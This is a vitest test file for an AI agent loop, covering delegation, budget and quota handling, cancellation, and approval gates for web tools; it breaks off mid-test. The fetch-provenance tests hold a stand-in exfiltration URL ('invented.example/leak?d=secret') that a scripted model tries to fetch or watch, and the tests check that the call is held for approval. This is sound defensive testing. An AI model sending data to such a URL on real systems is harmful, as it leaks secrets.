import { describe, expect, it, vi } from 'vitest';
import { quotaRejection } from '../../providers/claude-code-local/quota.js';
import { FakeProvider as Fake, ProviderError, ProviderRegistry, type FakeProvider, type LLMProvider } from '../../providers/index.js';
import { AI_WARROOM_CHANNEL_ID } from '../../company/channels.js';
import { estimateInputTokens, WARROOM_NOTE } from '../context.js';
import { runAgent } from './loop.js';
import { SONNET, owned, respond, route, setup, useScript } from './loop-fixture.js';
import { CTO, SA, humanMsg, promptsWithTool } from '../test-helpers.js';
import { fakeResolver, fakeTransport } from '../../tests/fakes/net.js';
import { fetchPageTool } from '../../tools/plugins/web/fetchPage.js';
import { webSearchTool } from '../../tools/plugins/web/webSearch.js';
import { watchGroup } from '../../tools/plugins/watch/index.js';

describe('runAgent', () => {
  it('respond tool call becomes payload', async () => {
    const s = await setup({ script: [{ toolUses: [respond('Hi there', { type: 'report', title: 'Status', fields: [{ name: 'a', value: 'b' }] })], usage: { inputTokens: 1000, outputTokens: 100 } }] });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('status?'), task: null, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'report', title: 'Status', body: 'Hi there', fields: [{ name: 'a', value: 'b' }] });
    expect(out.payload.footer).toMatchObject({ model: SONNET, costUsd: out.costUsd });
    expect(out.costUsd).toBeCloseTo((1000 * 2 + 100 * 10) / 1e6, 9);
    expect(out.turns).toBe(1);
    expect(out.stopped).toBeUndefined();
    expect(s.budget.settled).toEqual([['r1', out.costUsd]]);
  });

  it('plain text answer falls back to chat payload', async () => {
    const s = await setup({ script: [{ text: 'Sure, here you go.' }] });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hello'), task: null, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'chat', body: 'Sure, here you go.' });
  });

  it('create_task from CTO to system-analyst creates child task depth 1', async () => {
    const s = await setup();
    const parent = await owned(s.tasks, CTO);
    const p = useScript(s, [
      { toolUses: [{ name: 'create_task', input: { title: 'Spec', description: 'Write spec', assignee: SA, estCostUsd: 0.2 } }] },
      { toolUses: [respond('Delegated to SA')] },
    ]);
    const created: unknown[] = [];
    s.bus.on('task.created', (e) => void created.push(e));
    const out = await runAgent({ route: route(CTO), task: parent, history: [] }, s.deps);
    const child = [...s.tasks.rows.values()].find((t) => t.parentId === parent.id)!;
    expect(child).toMatchObject({ depth: 1, rootId: parent.id, owner: SA, requester: CTO, deptId: 'software', status: 'todo', estCostUsd: 0.2 });
    expect(created).toEqual([{ task: expect.objectContaining({ id: child.id }) }]);
    expect(out.payload.body).toBe('Delegated to SA');
    // The tool result went back to the model in the next request.
    const second = p.calls[1]!;
    expect(second.messages.at(-1)).toEqual({ role: 'user', content: [expect.objectContaining({ type: 'tool_result', toolUseId: 'fake_tu_1', content: expect.stringContaining(child.id) })] });
  });

  it('persona create_task to other dept head returns tool error', async () => {
    // Give system-analyst create_task in its meta so the call reaches the code-side delegation guard.
    const s = await setup({
      prompts: promptsWithTool('members/system-analyst', 'create_task'),
      script: [
        { toolUses: [{ name: 'create_task', input: { title: 'Ads', description: 'Run ads', assignee: { kind: 'head', dept: 'marketing' }, estCostUsd: 0 } }] },
        { toolUses: [respond('could not delegate')] },
      ],
    });
    const parent = await owned(s.tasks, SA);
    await runAgent({ route: route(SA), task: parent, history: [] }, s.deps);
    const result = (s.provider as FakeProvider).calls[1]!.messages.at(-1)!.content[0]!;
    expect(result).toMatchObject({ type: 'tool_result', isError: true, content: expect.stringMatching(/cannot delegate/) });
    expect(s.tasks.rows.size).toBe(1);
  });

  it('stops with budget when reserve fails and posts nothing to provider', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    s.budget.next = async () => ({ ok: false, scope: 'bot' });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', turns: 0, costUsd: 0, payload: { type: 'alert' } });
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
  });

  it('halted before start makes zero provider calls', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    await s.cfg.set('halted', true, 'test');
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out.stopped).toBe('halted');
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
    expect(s.budget.reserves).toHaveLength(0);
  });

  it('turn limit marks task blocked with reason turns', async () => {
    const s = await setup({ script: [{ text: 'never' }], turnsPerTask: 3 });
    const task = await owned(s.tasks, CTO, { turnsUsed: 3 });
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.stopped).toBe('turns');
    expect(await s.tasks.get(task.id)).toMatchObject({ status: 'blocked', blockedReason: 'turns' });
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
  });

  it('create_task with estCostUsd 2 goes awaiting_approval', async () => {
    const s = await setup({ script: [
      { toolUses: [{ name: 'create_task', input: { title: 'Big', description: 'Large job', assignee: SA, estCostUsd: 2 } }] },
      { toolUses: [respond('waiting for approval')] },
    ] });
    const parent = await owned(s.tasks, CTO);
    await runAgent({ route: route(CTO), task: parent, history: [] }, s.deps);
    const child = [...s.tasks.rows.values()].find((t) => t.parentId === parent.id)!;
    expect(child.status).toBe('awaiting_approval');
    expect(s.approvals.request).toHaveBeenCalledWith({ taskId: child.id, reason: expect.any(String), estCostUsd: 2, requestedBy: CTO });
    expect((await s.tasks.get(parent.id))!.status).not.toBe('awaiting_approval');
  });

  it('create_task with estCostUsd -1 returns tool error', async () => {
    const s = await setup({ script: [
      { toolUses: [{ name: 'create_task', input: { title: 'Neg', description: 'x', assignee: SA, estCostUsd: -1 } }] },
      { toolUses: [{ name: 'create_task', input: { title: 'Missing', description: 'x', assignee: SA } }] },
      { toolUses: [respond('ok')] },
    ] });
    const parent = await owned(s.tasks, CTO);
    await runAgent({ route: route(CTO), task: parent, history: [] }, s.deps);
    const calls = (s.provider as FakeProvider).calls;
    for (const i of [1, 2]) expect(calls[i]!.messages.at(-1)!.content[0]).toMatchObject({ type: 'tool_result', isError: true, content: expect.stringMatching(/estCostUsd/) });
    expect(s.tasks.rows.size).toBe(1);
  });

  it('6th create_task under one parent returns tool error', async () => {
    const make = (i: number) => ({ name: 'create_task', input: { title: `T${i}`, description: 'x', assignee: SA, estCostUsd: 0 } });
    const s = await setup({ script: [{ toolUses: [1, 2, 3, 4, 5, 6].map(make) }, { toolUses: [respond('ok')] }] });
    const parent = await owned(s.tasks, CTO);
    await runAgent({ route: route(CTO), task: parent, history: [] }, s.deps);
    const results = (s.provider as FakeProvider).calls[1]!.messages.at(-1)!.content;
    expect(results).toHaveLength(6);
    expect(results.slice(0, 5).every((r) => r.type === 'tool_result' && !r.isError)).toBe(true);
    expect(results[5]).toMatchObject({ type: 'tool_result', isError: true, content: expect.stringMatching(/child/) });
    expect(await s.tasks.countChildren(parent.id)).toBe(5);
  });

  it('a run whose task lives in the ai-warroom gets the terse bot-to-bot instruction; other runs do not', async () => {
    const s = await setup({ script: [{ text: 'ok' }] });
    const parent = await owned(s.tasks, CTO, { channelId: AI_WARROOM_CHANNEL_ID });
    await runAgent({ route: route(CTO), task: parent, history: [] }, s.deps);
    expect((s.provider as FakeProvider).calls[0]!.system).toContain(WARROOM_NOTE);
    const plain = await setup({ script: [{ text: 'ok' }] });
    await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, plain.deps);
    expect((plain.provider as FakeProvider).calls[0]!.system).not.toContain(WARROOM_NOTE);
  });

  it('reservation includes input tokens', async () => {
    const s = await setup({ script: [{ text: 'ok' }] });
    await runAgent({ route: route(CTO), msg: humanMsg('x'.repeat(30_000)), task: null, history: [] }, s.deps);
    const req = (s.provider as FakeProvider).calls[0]!;
    const inTok = estimateInputTokens(req);
    expect(inTok).toBeGreaterThan(10_000);
    expect(inTok).toBe(Math.ceil(Buffer.byteLength(req.system + JSON.stringify(req.messages) + JSON.stringify(req.tools), 'utf8') / 3));
    const expected = (inTok * 2 + req.maxTokens * 10) / 1e6;
    expect(s.budget.reserves).toEqual([{ actor: CTO, estUsd: expected, model: SONNET, provider: 'claude' }]);
  });

  it('task budget refusal requests tree-cap approval and makes no provider call', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    const root = await owned(s.tasks, CTO);
    const child = await s.tasks.create({ title: 'c', deptId: 'software', owner: SA, requester: CTO, origin: 'delegated', parentId: root.id });
    s.budget.next = async () => ({ ok: false, scope: 'task' });
    const out = await runAgent({ route: route(SA), task: child, history: [] }, s.deps);
    expect(out.stopped).toBe('budget');
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
    expect(s.budget.reserves[0]).toMatchObject({ taskId: child.id, model: 'claude-sonnet-5-5' });
    expect(s.approvals.onTreeCapHit).toHaveBeenCalledWith({ rootId: root.id, taskId: child.id, est: s.budget.reserves[0]!.estUsd, requestedBy: SA });
  });

  it('update_task on foreign task returns tool error', async () => {
    const s = await setup();
    const foreign = await owned(s.tasks, { kind: 'head', dept: 'marketing' });
    const p = useScript(s, [{ toolUses: [{ name: 'update_task', input: { taskId: foreign.id, status: 'done', summary: 'hijack' } }] }, { toolUses: [respond('ok')] }]);
    await runAgent({ route: route(CTO), msg: humanMsg('x'), task: null, history: [] }, s.deps);
    expect(p.calls[1]!.messages.at(-1)!.content[0]).toMatchObject({ isError: true, content: expect.stringMatching(/not the owner/) });
    expect((await s.tasks.get(foreign.id))!.status).toBe('todo');
  });

  it('reserve throws makes zero provider calls', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    s.budget.next = async () => { throw new Error('connection refused'); };
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', turns: 0, payload: { type: 'alert' } });
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'error' }));
  });

  it('passes beforeRetry: each retry makes a fresh reservation, extra holds are released, main one is settled', async () => {
    const s = await setup();
    const p: LLMProvider = {
      id: 'claude',
      async *chat(req) {
        await req.beforeRetry!();
        yield { type: 'text', text: 'ok' };
        yield { type: 'usage', inputTokens: 1, outputTokens: 1, cacheReadTokens: 0, cacheWriteTokens: 0 };
        yield { type: 'stop', reason: 'end_turn' };
      },
    };
    const reg = new ProviderRegistry();
    reg.register(p);
    s.deps.providers = reg;
    await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(s.budget.reserves).toHaveLength(2);
    expect(s.budget.settled.map(([id]) => id)).toEqual(['r1']);
    expect(s.budget.released).toEqual(['r2']);
  });

  it('a refused retry reservation throws inside the provider so the retry stops', async () => {
    const s = await setup();
    let refusal: unknown;
    const p: LLMProvider = {
      id: 'claude',
      async *chat(req) {
        s.budget.next = async () => ({ ok: false, scope: 'company' });
        try { await req.beforeRetry!(); } catch (e) { refusal = e; }
        yield { type: 'stop', reason: 'end_turn' };
      },
    };
    const reg = new ProviderRegistry();
    reg.register(p);
    s.deps.providers = reg;
    await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(refusal).toBeInstanceOf(Error);
  });

  const retryingProvider = (seen: { err?: unknown }): LLMProvider => ({
    id: 'claude',
    async *chat(req) {
      try { await req.beforeRetry!(); } catch (e) { seen.err = e; throw new ProviderError('upstream 503', { retryable: false, status: 503 }); }
      yield { type: 'stop', reason: 'end_turn' };
    },
  });
  const refuseRetry = (s: Awaited<ReturnType<typeof setup>>, scope: string) => {
    let n = 0;
    s.budget.next = async () => (n++ === 0 ? { ok: true, reservationId: 'first' } : ({ ok: false, scope } as never));
  };

  it('a refused retry reservation yields the budget stop, an audit row and releases only the main hold', async () => {
    const s = await setup();
    const reg = new ProviderRegistry();
    reg.register(retryingProvider({}));
    s.deps.providers = reg;
    refuseRetry(s, 'company');
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', payload: { type: 'alert' } });
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'refused:company' }));
    expect(s.budget.released).toEqual(['first']);
    expect(s.budget.settled).toEqual([]);
  });

  it('SPEND-1 S20: a dept refusal says the department monthly budget, never the bot daily one', async () => {
    const { budgetText } = await import('../call/call.js');
    const t = budgetText({ kind: 'refused', scope: 'dept', est: 1 }, 'm');
    expect(t).toContain('department monthly budget');
    expect(t).toContain('#⚙️-setting');
    expect(t).not.toMatch(/bot daily|daily budget|the bot/i);
    const s = await setup();
    const reg = new ProviderRegistry();
    reg.register(retryingProvider({}));
    s.deps.providers = reg;
    refuseRetry(s, 'dept');
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget' });
    expect(JSON.stringify(out)).toContain('department monthly budget');
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'refused:dept' }));
  });

  it('a refused retry reservation with scope task goes through treeCapHit', async () => {
    const s = await setup();
    const reg = new ProviderRegistry();
    reg.register(retryingProvider({}));
    s.deps.providers = reg;
    const task = await owned(s.tasks, CTO);
    refuseRetry(s, 'task');
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.stopped).toBe('budget');
    expect(s.approvals.onTreeCapHit).toHaveBeenCalledTimes(1);
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'refused:task' }));
  });

  describe('AUTO-1: a refused reservation with scope project', () => {
    const projectRun = async (autopilot?: NonNullable<Parameters<typeof runAgent>[1]['autopilot']>) => {
      const s = await setup();
      const reg = new ProviderRegistry();
      reg.register(retryingProvider({}));
      s.deps.providers = reg;
      if (autopilot) s.deps.autopilot = autopilot;
      const task = await owned(s.tasks, CTO);
      refuseRetry(s, 'project');
      const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
      return { s, task, out };
    };
    it('goes through budgetHit (not the tree or local cap card) and stops with the fixed project text', async () => {
      const hit: string[] = [];
      const { s, task, out } = await projectRun({ budgetHit: async (t) => void hit.push(t.id) });
      expect(hit).toEqual([task.id]);
      expect(out.stopped).toBe('budget');
      expect(JSON.stringify(out)).toContain('Project budget used up');
      expect(JSON.stringify(out)).toContain('this task is blocked until then');
      expect(s.approvals.onTreeCapHit).not.toHaveBeenCalled();
      expect(s.approvals.onLocalCapHit).not.toHaveBeenCalled();
      expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'refused:project' }));
    });
    it('with no port the loop blocks the task itself (reason budget)', async () => {
      const { s, task, out } = await projectRun();
      expect(out.stopped).toBe('budget');
      expect(await s.tasks.get(task.id)).toMatchObject({ status: 'blocked', blockedReason: 'budget' });
    });
    it('a throwing port still stops, blocks the task and audits an error without any text from the throw', async () => {
      const { s, task, out } = await projectRun({ budgetHit: async () => { throw new Error('SECRET-MARKER-123'); } });
      expect(out.stopped).toBe('budget');
      expect(await s.tasks.get(task.id)).toMatchObject({ status: 'blocked', blockedReason: 'budget' });
      expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'project.budget_hit', outcome: 'error' }));
      expect(JSON.stringify([out, s.spy.entries])).not.toContain('SECRET-MARKER');
    });
    it('budgetText names the project', async () => {
      const { budgetText } = await import('../call/call.js');
      expect(budgetText({ kind: 'refused', scope: 'project', est: 1 }, 'm')).toBe('This project used its budget.');
    });
  });

  it('a throwing retry reservation audits outcome error and stops with the budget alert', async () => {
    const s = await setup();
    const reg = new ProviderRegistry();
    reg.register(retryingProvider({}));
    s.deps.providers = reg;
    let n = 0;
    s.budget.next = async () => { if (n++ === 0) return { ok: true, reservationId: 'first' }; throw new Error('db down'); };
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget' });
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'budget.reserve', outcome: 'error' }));
    expect(s.budget.released).toEqual(['first']);
  });

  it('extra retry holds are released exactly once when the call then fails', async () => {
    const s = await setup();
    const p: LLMProvider = {
      id: 'claude',
      async *chat(req) {
        await req.beforeRetry!();
        throw new ProviderError('upstream', { retryable: true, status: 503 });
      },
    };
    const reg = new ProviderRegistry();
    reg.register(p);
    s.deps.providers = reg;
    await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(s.budget.released).toEqual(['r1', 'r2']);
  });

  it('extra retry holds are released exactly once when the call is aborted', async () => {
    const s = await setup();
    const p: LLMProvider = {
      id: 'claude',
      async *chat(req, signal) {
        await req.beforeRetry!();
        await new Promise((r) => signal.addEventListener('abort', r, { once: true }));
        yield { type: 'stop', reason: 'aborted' };
      },
    };
    const reg = new ProviderRegistry();
    reg.register(p);
    s.deps.providers = reg;
    const run = runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    await vi.waitFor(() => expect(s.budget.reserves).toHaveLength(2));
    (s.deps.halt as unknown as { abortInFlight(): number }).abortInFlight();
    await run.catch(() => undefined);
    expect([...s.budget.released].sort()).toEqual(['r1', 'r2']);
  });

  it('ProviderError after retries returns alert payload and marks task blocked with reason error', async () => {
    const failing: LLMProvider = {
      id: 'claude',
      async *chat() { throw new ProviderError('overloaded', { retryable: true, status: 529 }); },
    };
    const s = await setup({ provider: failing });
    const task = await owned(s.tasks, CTO);
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'alert' });
    expect(await s.tasks.get(task.id)).toMatchObject({ status: 'blocked', blockedReason: 'error' });
    expect(s.budget.released).toEqual(['r1']);
    expect(s.budget.settled).toEqual([]);
  });
});

describe('runAgent: quota rejection (OPS-HOLD)', () => {
  it('a quota-rejected call goes back to todo (not blocked: error), emits task.changed, tells the person it will resume; budget released', async () => {
    const failing: LLMProvider = { id: 'claude', async *chat() { throw quotaRejection(); } };
    const s = await setup({ provider: failing });
    const task = await owned(s.tasks, CTO);
    const changes: unknown[] = [];
    s.deps.bus.on('task.changed', (e) => void changes.push([e.from, e.to]));
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'alert', title: 'Claude quota used up' });
    expect(JSON.stringify(out.payload)).toContain('resumes by itself');
    expect(await s.tasks.get(task.id)).toMatchObject({ status: 'todo' });
    expect(await s.tasks.get(task.id)).not.toMatchObject({ blockedReason: 'error' });
    expect(changes).toContainEqual(['doing', 'todo']);
    expect(s.budget.released).toEqual(['r1']);
  });
  it('a quota-rejected call of a run without a task only answers; other provider errors still block as before', async () => {
    const failing: LLMProvider = { id: 'claude', async *chat() { throw quotaRejection(); } };
    const s = await setup({ provider: failing });
    const out = await runAgent({ route: route(CTO), task: null, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'alert', title: 'Claude quota used up' });
  });
});

describe('runAgent: claude-code-local governance (L7, L8, L9)', () => {
  const LOCAL = 'claude-code-local';
  const localSetup = async (script = [{ text: 'hi', usage: { inputTokens: 100, outputTokens: 10 } }]) => {
    const s = await setup({ provider: new Fake(script, LOCAL) });
    s.cfg.values.set('provider.default', { provider: LOCAL, model: 'local/claude-sonnet-5-5' });
    return s;
  };

  it('a local call reserves $0 with the provider and its signal, needs no price and settles 0', async () => {
    const s = await localSetup();
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'chat', body: 'hi' });
    expect(s.budget.reserves).toEqual([{ actor: CTO, estUsd: 0, model: 'local/claude-sonnet-5-5', provider: LOCAL, signal: expect.any(AbortSignal) }]);
    expect(s.budget.settled).toEqual([['r1', 0]]);
    expect(out.costUsd).toBe(0);
    expect(s.spy.entries).toContainEqual(expect.objectContaining({ action: 'llm.call', provider: LOCAL, costUsd: 0 }));
  });

  it('a persona in local mode runs on local/claude-sonnet-5-5', async () => {
    const s = await localSetup();
    await runAgent({ route: route(SA), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect((s.provider as FakeProvider).calls[0]!.model).toBe('local/claude-sonnet-5-5');
  });

  it('local_task refusal requests a local cap approval and makes no provider call', async () => {
    const s = await localSetup();
    const root = await owned(s.tasks, CTO);
    s.budget.next = async () => ({ ok: false, scope: 'local_task' });
    const out = await runAgent({ route: route(CTO), task: root, history: [] }, s.deps);
    expect(out.stopped).toBe('budget');
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
    expect(s.approvals.onLocalCapHit).toHaveBeenCalledWith({ rootId: root.id, taskId: root.id, requestedBy: CTO });
    expect(s.approvals.onTreeCapHit).not.toHaveBeenCalled();
    expect((await s.tasks.get(root.id))!.status).toBe('awaiting_approval');
  });

  it('scope local stops with the local quota alert', async () => {
    const s = await localSetup();
    s.budget.next = async () => ({ ok: false, scope: 'local' });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', payload: { type: 'alert', body: expect.stringMatching(/local call/) } });
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
  });

  it('local_task without a task is not reported as the daily quota', async () => {
    const s = await localSetup();
    s.budget.next = async () => ({ ok: false, scope: 'local_task' });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', payload: { body: expect.stringMatching(/local model call cap/) } });
    expect(JSON.stringify(out.payload)).not.toMatch(/daily/);
  });

  it('an actor whose provider is not registered gets an alert and no call (does not throw)', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    s.deps.providers = new ProviderRegistry(); // nothing registered: provider.default claude is unavailable
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out.payload).toMatchObject({ type: 'alert', title: 'Unavailable' });
    expect(s.budget.reserves).toEqual([]);
  });

  it('D4 still holds for provider claude: a local model id has no price', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    s.cfg.values.set('provider.default', { provider: 'claude', model: 'local/claude-sonnet-5-5' });
    const out = await runAgent({ route: route(CTO), msg: humanMsg('hi'), task: null, history: [] }, s.deps);
    expect(out).toMatchObject({ stopped: 'budget', payload: { body: expect.stringMatching(/no price/) } });
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
  });
});

describe('runAgent fetch provenance (R17, P5)', () => {
  async function webRun(fetchUrl: string, msgText: string) {
    const p = promptsWithTool('heads/software', 'web_search');
    const d = p.get('heads/software')!;
    p.set('heads/software', { ...d, meta: { ...d.meta, tools: [...d.meta.tools, 'fetch_page'] } });
    const s2 = await setup({ prompts: p });
    const transport = fakeTransport({ [fetchUrl]: { body: '<p>page</p>' } });
    const resolver = fakeResolver({ 'found.example': ['93.184.215.14'], 'typed.example': ['93.184.215.14'], 'invented.example': ['93.184.215.14'] });
    s2.deps.tools.register(fetchPageTool({ resolver, transport, extraPorts: () => [] }));
    s2.deps.tools.register(webSearchTool({ search: async () => [{ title: 'Found', url: 'https://found.example/a', snippet: 'x' }] }));
    const task = await owned(s2.tasks, CTO);
    useScript(s2, [
      { toolUses: [{ name: 'web_search', input: { query: 'q' } }] },
      { toolUses: [{ name: 'fetch_page', input: { url: fetchUrl } }] },
      { toolUses: [respond('done')] },
    ]);
    await runAgent({ route: route(CTO), msg: humanMsg(msgText), task, history: [] }, s2.deps);
    return { transport, approvals: s2.approvals };
  }

  it('tainted run fetching a model-invented URL awaits approval; a URL from the human message or an earlier search result does not', async () => {
    const invented = await webRun('https://invented.example/leak?d=secret', 'look up dns');
    expect(invented.transport.requests).toHaveLength(0);
    expect(invented.approvals.request).toHaveBeenCalledWith(expect.objectContaining({ kind: 'tool', tool: { name: 'fetch_page', input: { url: 'https://invented.example/leak?d=secret' } } }));

    const typed = await webRun('https://typed.example/page', 'please read https://typed.example/page.');
    expect(typed.approvals.request).not.toHaveBeenCalled();
    expect(typed.transport.requests).toHaveLength(1);

    const found = await webRun('https://found.example/a', 'look up dns');
    expect(found.approvals.request).not.toHaveBeenCalled();
    expect(found.transport.requests).toHaveLength(1);
  });

  it('loop.test.ts › tainted run adding a watch on a model-invented URL awaits approval (P5); so does a typed one (central write policy)', async () => {
    async function run(target: string, msgText: string) {
      const p = promptsWithTool('heads/software', 'web_search');
      const d = p.get('heads/software')!;
      p.set('heads/software', { ...d, meta: { ...d.meta, tools: [...d.meta.tools, 'watch_add'] } });
      const s2 = await setup({ prompts: p });
      const net = { resolver: fakeResolver({ 'found.example': ['93.184.215.14'], 'typed.example': ['93.184.215.14'], 'invented.example': ['93.184.215.14'] }), transport: fakeTransport({}) };
      const add = vi.fn(async (w: object) => ({ id: 1, ...w }));
      const g = watchGroup({ env: { guildId: 'g' }, cfg: s2.deps.cfg, log: { warn: () => undefined }, clock: () => 0, watches: { add, list: vi.fn(), remove: vi.fn() }, net } as never);
      if ('disabled' in g) throw new Error('disabled');
      for (const t of g.tools) s2.deps.tools.register(t);
      s2.deps.tools.register(webSearchTool({ search: async () => [{ title: 'Found', url: 'https://found.example/a', snippet: 'x' }] }));
      const task = await owned(s2.tasks, CTO);
      useScript(s2, [
        { toolUses: [{ name: 'web_search', input: { query: 'q' } }] },
        { toolUses: [{ name: 'watch_add', input: { kind: 'url', target, intervalMinutes: 30 } }] },
        { toolUses: [respond('done')] },
      ]);
      await runAgent({ route: route(CTO), msg: { ...humanMsg(msgText), author: { id: '42', name: 'u', kind: 'human' } }, task, history: [] }, s2.deps);
      return { add, approvals: s2.approvals };
    }
    const invented = await run('https://invented.example/leak?d=secret', 'look up dns');
    expect(invented.approvals.request).toHaveBeenCalledWith(expect.objectContaining({ kind: 'tool', tool: expect.objectContaining({ name: 'watch_add' }) }));
    expect(invented.add).not.toHaveBeenCalled();
    // the central write policy (R3) asks for every write after untrusted content, typed url or not
    expect((await run('https://typed.example/page', 'please watch https://typed.example/page.')).approvals.request).toHaveBeenCalled();
  });
});

describe('runAgent: admin task cancel (TASKADMIN-1, TA-C9..C11)', () => {
  const hang = (): LLMProvider => ({
    id: 'claude',
    async *chat(_req, signal) {
      await new Promise((r) => signal.addEventListener('abort', r, { once: true }));
      yield { type: 'stop', reason: 'aborted' };
    },
  });
  const useProvider = (s: Awaited<ReturnType<typeof setup>>, p: LLMProvider) => {
    const reg = new ProviderRegistry();
    reg.register(p);
    s.deps.providers = reg;
  };

  it('a cancel that lands while the model streams ends the run as cancelled with a fixed alert, not as halted', async () => {
    const s = await setup();
    useProvider(s, hang());
    const task = await owned(s.tasks, CTO);
    const run = runAgent({ route: route(CTO), task, history: [] }, s.deps);
    await vi.waitFor(() => expect(s.budget.reserves).toHaveLength(1));
    await vi.waitFor(() => expect(s.taskRuns.active(task.id)).toBe(true));
    expect(s.taskRuns.abort([task.id])).toBe(1);
    const out = await run;
    expect(out.stopped).toBe('cancelled');
    expect(out.payload).toMatchObject({ type: 'alert', title: 'Task cancelled', body: 'This task was cancelled. Nothing more will run.' });
    expect(s.taskRuns.active(task.id)).toBe(false); // untracked in the same finally as the halt tracker
  });

  it('a halt abort of a task run still says Halted (the shutdown path is unchanged)', async () => {
    const s = await setup();
    useProvider(s, hang());
    const task = await owned(s.tasks, CTO);
    const run = runAgent({ route: route(CTO), task, history: [] }, s.deps);
    await vi.waitFor(() => expect(s.budget.reserves).toHaveLength(1));
    (s.deps.halt as unknown as { abortInFlight(): number }).abortInFlight();
    const out = await run;
    expect(out.stopped).toBe('halted');
    expect(out.payload).toMatchObject({ title: 'Halted' });
  });

  it('a task already marked cancelled starts no provider call (iteration top)', async () => {
    const s = await setup({ script: [{ text: 'never' }] });
    const task = await owned(s.tasks, CTO);
    s.taskRuns.abort([task.id]);
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.stopped).toBe('cancelled');
    expect((s.provider as FakeProvider).calls).toHaveLength(0);
    expect(s.budget.reserves).toHaveLength(0);
  });

  it('the fresh row status cancelled stops the run too (cross-process backstop: no in-memory mark needed)', async () => {
    const s = await setup({ script: [{ toolUses: [respond('first')] , text: 'x' }] });
    const task = await owned(s.tasks, CTO);
    const real = s.tasks.update.bind(s.tasks);
    // the row comes back cancelled from the turnsUsed write that follows the model call
    s.tasks.update = async (id, patch, exp) => {
      const r = await real(id, patch, exp);
      if (patch.turnsUsed !== undefined) await real(id, { status: 'cancelled' });
      return r ? ((await s.tasks.get(id)) ?? r) : r;
    };
    const out = await runAgent({ route: route(CTO), task, history: [] }, s.deps);
    expect(out.stopped).toBe('cancelled');
    expect(out.payload).toMatchObject({ title: 'Task cancelled' });
  });

  it('the second tool of a batch is refused with "task cancelled" and does not run', async () => {
    const ran: string[] = [];
    const s = await setup({ script: [] });
    const task = await owned(s.tasks, CTO);
    const { z } = await import('zod');
    s.deps.tools.register({ name: 'probe_a', description: 'a', inputSchema: z.object({}).passthrough(), requiresApproval: () => false, run: async () => { ran.push('a'); s.taskRuns.abort([task.id]); return { content: 'a done' }; } });
    s.deps.tools.register({ name: 'probe_b', description: 'b', inputSchema: z.object({}).passthrough(), requiresApproval: () => false, run: async () => { ran.push('b'); return { content: 'b done' }; } });
    s.deps.prompts = promptsWithTool('heads/software', 'probe_a');
    const d = s.deps.prompts.get('heads/software')!;
    s.deps.prompts.set('heads/software', { ...d, meta: { ...d.meta, tools: [...d.meta.tools, 'probe_b'] } });
    s.deps.org = await (await import('../test-helpers.js')).seededOrg({ prompts: s.deps.prompts });
    const p = useScript(s, [{ toolUses: [{ name: 'probe_a', input: {} }, { name: 'probe_b', input: {} }] }, { text: 'never' }]);
